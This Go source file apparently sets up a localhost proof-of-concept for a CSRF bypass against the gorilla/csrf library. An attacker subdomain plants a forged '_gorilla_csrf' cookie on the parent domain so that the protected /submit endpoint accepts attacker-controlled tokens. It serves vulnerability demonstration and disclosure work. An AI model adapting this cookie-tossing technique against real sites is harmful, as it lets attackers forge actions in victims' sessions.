package main

import (
	"bytes"
	"crypto/tls"
	"flag"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"

	_ "embed"

	"github.com/gorilla/csrf"
)

//go:embed attacker.html
var attackerTemplateBytes []byte
var attackerTemplate = template.Must(template.New("attacker").Parse(string(attackerTemplateBytes)))

//go:embed target.html
var targetTemplateBytes []byte
var targetTemplate = template.Must(template.New("target").Parse(string(targetTemplateBytes)))

//go:embed inject.js
var injectJSTemplateBytes []byte
var injectJSTemplate = template.Must(template.New("inject.js").Parse(string(injectJSTemplateBytes)))

var domain = flag.String("domain", "foo.example.com", "domain to use for the demo (bind it and bad.$DOMAIN to localhost with /etc/hosts)")
var tlsCertFile = flag.String("tls-cert", "", "path to TLS certificate file")
var tlsKeyFile = flag.String("tls-key", "", "path to TLS key file")

func main() {
	flag.Parse()
	if *tlsCertFile == "" || *tlsKeyFile == "" {
		log.Fatal("both -tls-cert and -tls-key must be provided")
	}

	cer, err := tls.LoadX509KeyPair(*tlsCertFile, *tlsKeyFile)
	if err != nil {
		log.Println(err)
		return
	}

	config := &tls.Config{Certificates: []tls.Certificate{cer}}
	ln, err := tls.Listen("tcp", ":443", config)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("listening on %s", ln.Addr())
	log.Printf("PID is %d", os.Getpid())

	primaryOrigin := csrf.Protect([]byte("32-byte-long-auth-key"), csrf.Secure(true))(http.HandlerFunc(primaryOriginHandler))

	attackerOriginMux := http.NewServeMux()
	attackerOriginMux.HandleFunc("/set-cookie", attackerOriginSetCookieHandler)
	attackerOriginMux.HandleFunc("/", attackerOriginHandler)

	if err := http.Serve(ln, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		log.Printf("%s %s %s", r.Host, r.Method, r.URL)
		if r.Host == *domain {
			primaryOrigin.ServeHTTP(w, r)
		} else {
			attackerOriginMux.ServeHTTP(w, r)
		}
	})); err != nil && err != http.ErrServerClosed {
		log.Fatal(err)
	}
}

func serveTargetHome(w http.ResponseWriter, r *http.Request) {

	data := map[string]any{
		csrf.TemplateTag: csrf.TemplateField(r),
		"CSRFToken":      csrf.Token(r),
	}
	w.Header().Set("Content-Type", "text/html")

	b := bytes.NewBuffer(nil)
	if err := targetTemplate.Execute(b, data); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	if _, err := io.Copy(w, b); err != nil {
		log.Printf("error writing response: %v", err)
		return
	}
}

func primaryOriginHandler(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		switch r.URL.Path {
		case "/":
			serveTargetHome(w, r)
			return
		case "/inject.js":
			w.Header().Set("Content-Type", "application/javascript")
			if err := injectJSTemplate.Execute(w, map[string]any{"Domain": *domain}); err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
			}
			return
		default:
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	case "POST":
		if r.URL.Path == "/submit" {
			io.WriteString(w, "SUCCESSFUL POST REQUEST")
			return
		}
		http.Error(w, "invalid POST request", http.StatusBadRequest)
	}
}

func attackerOriginSetCookieHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "invalid method", http.StatusBadRequest)
		return
	}

	// create the malicious CSRF cookie
	c := http.Cookie{
		Name:   "_gorilla_csrf",
		Domain: "example.com",
		Path:   "/submit",
	}

	if err := r.ParseForm(); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	token := r.Form.Get("token")
	if token == "" {
		http.Error(w, "missing token", http.StatusBadRequest)
		return
	}
	c.Value = token

	http.SetCookie(w, &c)
	io.WriteString(w, "Wrote cookie with token: "+c.Value)
}

func attackerOriginHandler(w http.ResponseWriter, r *http.Request) {
	// template the attacker page
	w.Header().Set("Content-Type", "text/html")
	data := map[string]any{
		"Domain": *domain,
		"Token":  "attacker-controlled",
	}
	b := bytes.NewBuffer(nil)
	if err := attackerTemplate.Execute(b, data); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	if _, err := io.Copy(w, b); err != nil {
		log.Printf("error writing response: %v", err)
		return
	}
}
